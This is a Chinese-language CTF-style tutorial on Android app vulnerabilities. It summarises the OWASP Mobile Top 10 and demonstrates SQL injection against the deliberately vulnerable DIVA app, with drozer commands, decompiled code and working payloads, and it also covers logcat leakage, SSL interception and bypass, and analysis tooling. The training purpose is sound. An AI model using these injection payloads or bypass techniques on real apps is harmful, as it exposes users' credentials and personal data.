---
title: Android APP常见漏洞和挖掘技巧 PART2
date: 2018-02-12 00:00:00
categories:
- CTF/Android
tags:
---

## 基本知识
本节内容的安全问题主要属于是Android架构上两层的，即应用框架层和应用层。

### 应用框架层

> 仅仅罗列框架的名字是没有用的，如果不能知道这些框架或者组件如何应用，是无法从根本上理解这个分层结构的（暂时放着等待解决）

- Views
- Content Providers
- Resource Manager
- Notification Manager
- Activity Manager
- Window Manager
- Package Manager

### 应用层
- 系统应用
- 其他应用

### 四大组件

> 应用组件是组成安卓应用的关键部分。每个应用都是由一个或者多个组件组成，并且每个都是单独调用。

- Activity
- Service
- Broadcast Receiver
- Content Provider

> 问题
四大组件是哪层的？

## OWASP top 10

1. M1: 平台使用不当
- 概述：平台功能的滥用，或者未能使用平台的安全控制，如Intent的误用、权限误用等
- 风险：很广泛，可能涉及移动平台的各个服务

2. M2：不安全的存储
- 概述：包括使用SQL数据库、日志文件、SD卡存储时不安全的数据存储方 式，以及操作系统、开发框架、编译器环境、硬件设备漏洞等导致的非故意的数据泄漏
- 风险：可能会导致数据丢失，或者应用程序中的敏感信息泄漏

3. M3：不安全的通信
- 概述：从A点到B点之间不安全地获取数据的所有方面，包括移动设备之间 的通信、应用程序至服务器之间的通信、移动设备至其他设备的通信等，涉及的通信方式包括TCP/IP、 WiFi、蓝牙、NFC、音频、红外、GSM、 3G、短信等
- 风险：可能会导致中间人攻击:包括数据窃听、数据篡改回放等

4. M4：不安全的身份验证
- 概述：包括对终端用户身份验证或会话管理的问题，例如使用不安全的信 道进行身份验证而导致欺骗、重放或其他针对身份验证的攻击
- 风险：APP客户端或服务端可能会向未识别身份的用户暴露数据或提供服务

5. M5：加密不足
- 概述：使用不当的加密方法对敏感信息进行加密，例如使用了不安全或过 时的加密算法、密钥管理不当(弱密钥、硬编码密钥)、使用了存在漏洞的自定义加密算法等
- 风险：数据机密性受到破坏(数据破解)或者数据完整性受到破坏(数据伪造攻击)

6. M6：不安全的授权
- 概述：不安全的授权管理，如果移动终端APP包含不安全的直接对象引用 (IDOR)、隐藏的服务端接口、通过数据请求传递用户角色或权限信息等，则可能会存在不安全的授权问题
- 风险：对未经授权的用户授予访问权限，未授权用户可执行他们本不能执 行的创建、读取、更新、删除(CRUD)等操作，可以使用本没有授予他 们的服务

7. M7：客户端代码质量问题
- 概述：移动客户端代码级别开发问题，包括缓冲区溢出、字符串格式漏洞以及其他不同类型的代码级错误
- 风险：允许攻击者利用错误的业务逻辑，或通过漏洞绕过设备上的安全控制，或以意外的方式暴露敏感数据

8. M8：代码篡改
- 概述：包括对APP的二进制修补、本地资源修改、API Hook和动态内存修改等
- 风险：攻击者通过对代码篡改可以改变应用程序的运行逻辑、在合法应用 程序中植入恶意代码、改变或中断向服务端的网络流量等

9. M9：逆向工程
- 概述：缺少代码混淆和加固手段，导致APP二进制文件容易被进行逆向分析
- 风险：攻击者能通过逆向工程观察到程序代码、工作逻辑以及代码中的加 密常数、密码等信息，能够对APP进行重打包

10. M10：无关功能
- 概述：在应用程序中启用了不打算发布的功能(如测试后门、调试信息打印、暂时禁用的安全验证、额外权限等)
- 风险：攻击者可能通过这些额外的功能窃取敏感数据或使用未经授权的功能

## 典型漏洞及挖掘方法

### SQL注入漏洞(M7)

#### 成因

在使用sqlite数据库时没有采取合适的过滤输入方法，导致sql语句可被拼接以及改写。Android应用一般在如下两个位置来完成数据库的操作：即Content Providers和Activity中。

#### sqlite

1. Android中的数据库实现为sqlite，一种轻量级基于文件的数据库。
2. 一个数据库就是一个db文件，一般保存在/data/data/<package-name>/databases/*.db
3. db文件可以使用支持查看sqlite的软件打开，如navicat，SQLiteManager等，或者使用sqlite命令直接进入数据库的命令行模式。
4. 在创建时权限一般为其他用户不可访问的私有数据，权限配置不当会出现数据存储漏洞（漏洞1）。当然root权限可以直接拿到。
5. sqlite本身不提供加密，但是仍可使用相应的工具对数据库文件进行加密，如SQLCipher，微信中的EnMicroMsg.db就是采取这种方式加密的。
6. 即使是本地加密了数据库，本质上仍是把钥匙和锁放在一起，并没太大作用，破解者可以通过逆向的方式找到加密秘钥。

#### 实验

> 实验apk为DIVA，一个故意设计的存在很多漏洞的Android app
链接:https://pan.baidu.com/s/1i63a9OL  密码:qrx4

##### DIVA

> Android App常见安全问题演练分析系统-DIVA-Part1
https://www.anquanke.com/post/id/84603

> Android App常见安全问题演练分析系统-DIVA-Part2
https://www.anquanke.com/post/id/86057


##### Content Providers中注入
> ContentProvider使用场景解读
https://www.jianshu.com/p/cdef889736ec
###### 条件
1. Content Providers组件暴露
2. 没有对输入进行有效的过滤
###### 检测
使用drozer进行检测：发现在Projection和Selection处均存在注入

```bash
dz>run scanner.provider.injection -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Not Vulnerable:
  content://jakhar.aseem.diva.provider.notesprovider
  content://jakhar.aseem.diva.provider.notesprovider/

Injection in Projection:
  content://jakhar.aseem.diva.provider.notesprovider/notes/
  content://jakhar.aseem.diva.provider.notesprovider/notes

Injection in Selection:
  content://jakhar.aseem.diva.provider.notesprovider/notes/
  content://jakhar.aseem.diva.provider.notesprovider/notes
```


###### 分析
1. Projection和Selection是啥?

ContentProvider中重写了query方法

```java
@Override
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)

其中Projection和Selection为query函数的参数，这两个参数会被拼接到sql语句中，位置如下:

select (projection) from tablename where (selection)
```

2. 查看DIVA反编译结果
```java
  public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();
        queryBuilder.setTables(TABLE);
        switch (urimatcher.match(uri)) {
            case 1:
                break;
            case 2:
                queryBuilder.appendWhere("_id=" + uri.getLastPathSegment());
                break;
            default:
                throw new IllegalArgumentException("Divanotes(query): Unknown URI " + uri);
        }
        if (sortOrder == null || sortOrder == "") {
            sortOrder = C_TITLE;
        }
        // 到此为止并没对projection, selection进行过滤，直接使用参数进行数据库的操作了
        Cursor cursor = queryBuilder.query(this.mDB, projection, selection, selectionArgs, null, null, sortOrder);
        cursor.setNotificationUri(getContext().getContentResolver(), uri);
        return cursor;
    }
```

###### 注入
使用drozer注入:这里我们使用projection参数注入，当然也可以采用selection注入，不过payload有不同
1. 爆出表名

```bash
run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection "* FROM SQLITE_MASTER WHERE type='table';--"
```

> SQLite数据库中有一个内置表,名为SQLITE_MASTER,此表中存储着当前数据库中所有表的相关信息
2. 爆出表中数据

```bash
run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection "* FROM notes ;--"
```

##### Activity中注入
就是整个操作数据库的逻辑在Activity中完成，DIVA中的第七关
###### 检测
因为这种在Activity的操作不方便自动检查，只能去看源码:DIVA中SQLInjectionActivity
```java
    public void search(View view) {
        EditText srchtxt = (EditText) findViewById(R.id.ivi1search);
        try {
        //直接拼接输入框中的字符串，没有任何过滤
            Cursor cr = this.mDB.rawQuery("SELECT * FROM sqliuser WHERE user = '" + srchtxt.getText().toString() + "'", null);
            StringBuilder strb = new StringBuilder("");
            if (cr == null || cr.getCount() <= 0) {
                strb.append("User: (" + srchtxt.getText().toString() + ") not found");
            } else {
                cr.moveToFirst();
                do {
                    strb.append("User: (" + cr.getString(0) + ") pass: (" + cr.getString(1) + ") Credit card: (" + cr.getString(2) + ")\n");
                } while (cr.moveToNext());
            }
            Toast.makeText(this, strb.toString(), 0).show();
        } catch (Exception e) {
            Log.d("Diva-sqli", "Error occurred while searching in database: " + e.getMessage());
        }
    }
```

###### 注入
直接输入框爆出所有用户名密码

```bash
'or'1'='1
```

#### 防护
无论是哪种方式来操作数据库都应该做好输入的过滤，并且保护好db文件，可采用适当的方式加密
#### 微信数据库破解
> http://blog.csdn.net/qq_24280381/article/details/73521836
#### SQLCipher之攻与防
> http://www.freebuf.com/articles/database/108904.html
### logcat数据泄露漏洞(M10)

#### 成因
在APP的开发过程中，为了方便调试，开发者通常会用logcat输出info、debug、error 等信息。如果在APP发布时没有去掉logcat信息，可能会导致攻击者通过查看logcat日志获得敏感信息。
- log.v :详细信息
- log.d: debug信息 
- log.i: info信息
- log.w: warning信息
- log.e: Error信息
#### 检测
1. 静态检测  
- 使用apktool等工具将APK文件反编译为smali代码，检索是否有logcat操作,例如:

```smali
Landroid/util/Log;->d( 
Landroid/util/Log;->v(
```

2. 动态检测
- 启动android sdk中的ddms或monitor
- 打开app并操作，在ddms窗口中选择app并设置要观测的tag，观察logcat日志中是否有敏感内容

## 流程总结
![image](http://ww3.sinaimg.cn/large/0060lm7Tly1fo3htlr2r7j31kw0e6dv6.jpg)

### 静态分析（检测）
> 快速检测，获得分析重点目标

使用apktool等工具对APK文件进行反编译，对反编译得到的文件和代码进行分析：
- AndroidManifest文件分析，检查Activity、Service、Receiver、Provider等组件是否存在暴露风险
- Smali代码分析，通过自动化脚本检测已知特征的漏洞风险，如数据存储漏洞、SSL证书校验漏洞、弱加 密漏洞、webview漏洞等

### 动态分析（验证）
> 对疑似风险进行验证和危害评估，主要是验证静态分析出来的风险

- 调试模式分析：使用adb调试模式进行分析
    - 验证组件暴露风险
    - 验证数据存储风险等
- APP人工操作：人工运行和操作APP的各项功能
    - 熟悉其功能和逻辑
    - 对可能存在的通用控件漏洞或控件使用不当造成的漏洞(如webview等)进行验证
- 网络数据分析：使用抓包工具，或者Fiddler等代理工具捕获分析 http(s)数据
    - 重点针对可能包含敏感数据传输的网络接口(如登陆信息、订单信息、 用户信息等) 
    - 明文传输漏洞验证:是否采用明文传输敏感信息(密码等)
    - SSL弱加密漏洞验证:使用Fiddler自签名证书进行内容还原
    - SSL强加密:使用Xposed插件进行绕过
    - 服务端接口分析:是否存在测试接口、未进行身份验证的接口、可暴力爬取敏感数据的接口等

### drozer（检测+验证）
> 集成静态分析与动态验证的工具，按照逻辑属于动态分析中的调试模式分析。
- 检测组件暴露、SQL注入等漏洞初步检测
- 如果存在以上漏洞，验证其风险，是否否导致敏感数据泄漏、验证绕过、非授权操作等。

### 逆向分析（CTF重点）
- Java文件逆向分析：  
采用SDK编写的代码，通过dex2jar、JD-GUI等工具可将其还原为java代码
- So文件逆向分析：  
采用NDK编写的代码，使用IDA加载so文件进行分析，使用Hex-rays插件将函数体转为C 语言
- 半调试半逆向：  
对于一些重要变量的值，可通过在smali代码中添加logcat代码，然后重打包生成新的APK 文件，运行该APK文件时通过DDMS查看logcat的输出
加密破解以及对逻辑和代码的进一步分析

### 自动化辅助

#### 开源系统

- MobSF  
包含Web界面 支持静态和动态分析，App后端Web API漏洞检测
- Marvin  
包括前端Web界面，部署麻烦 支持静态分析、动态分析、APP Ui自动遍历
- Inspeckage  
Xposed插件，包含WEB界面
能够查看Manifest信息、文件内容、Logcat日志、网 络通信等，能够调用未导出组件

#### 在线系统

腾讯御安全，阿里聚安全，360显危镜，梆梆，娜迦